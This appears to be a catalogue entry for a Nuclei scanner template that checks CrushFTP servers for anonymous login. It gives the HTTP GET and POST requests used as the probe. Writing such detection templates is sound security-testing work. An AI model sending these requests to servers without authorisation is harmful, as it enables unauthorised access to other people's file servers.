# Nuclei Template: CrushFTP - Anonymous Login
**Template ID:** crushftp-anonymous-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`crushftp-anonymous-login.yaml`)

## Vulnerability Information & PoC

## Description
CrushFTP Anonymous login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /WebInterface/ HTTP/1.1
Host: {{Hostname}}

POST /WebInterface/function/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

command=getUsername&random=0.4186510822713485&c2f={{auth}}
```

